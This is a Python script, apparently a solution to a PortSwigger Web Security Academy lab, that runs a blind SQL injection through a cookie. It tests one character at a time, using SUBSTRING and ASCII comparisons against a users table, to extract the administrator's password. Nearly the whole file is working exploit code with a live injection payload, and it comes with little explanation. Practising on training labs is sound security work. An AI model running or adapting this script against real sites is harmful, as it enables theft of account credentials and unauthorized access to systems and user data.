# Lab11 from portswigger: Blind SQL injection with conditional responses.
import requests
import sys
from termcolor import colored

# You can change and set the headers of your request.
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://0a39003c037dc514c08c4a0a00150000.web-security-academy.net/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers", "Connection": "close"} 

proxy = {"http" : "http://127.0.0.1:8080"}

admin_password=[]
def retrieve_password(url):
    for number in range(1,21): # Test each char position for the passoword(the password length is 20 char).
        for ascii_char in range(33,127): # Try the decimal numbers for each char from the ASCII table.
            payload =f"' AND (SELECT ASCII(SUBSTRING(password,{number},1)) FROM users WHERE username='administrator')={ascii_char}--"
            print(colored("hello","green"))
            cookies={  # You must change it and set the cookies of your request.
                "TrackingId": "2uFM62rGof2FsWEZ" + payload,
                "session": "3TzQGczPRWLnOmNypH0tRYU1LgFLhBuy"
                }
            response = requests.get(url, headers=headers, cookies=cookies, proxies=proxy)
            if ("Welcome back!") in response.text:
                print(colored(f"\n\n[+] Correct letter: {chr(ascii_char)}\n\n", "green"))
                admin_password.append(chr(ascii_char))
                break
            else:
                print(colored(cookies["TrackingId"],"red"))
    password=''.join(admin_password)
    print(colored(f"Admin password: {password}","cyan"))
       

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <url>")
        print(f"[+] Example usage: {sys.argv[0]} \"example.com\"")
    else:
        url = sys.argv[1]
        retrieve_password(url)    
 
if __name__ == '__main__':
    main()    
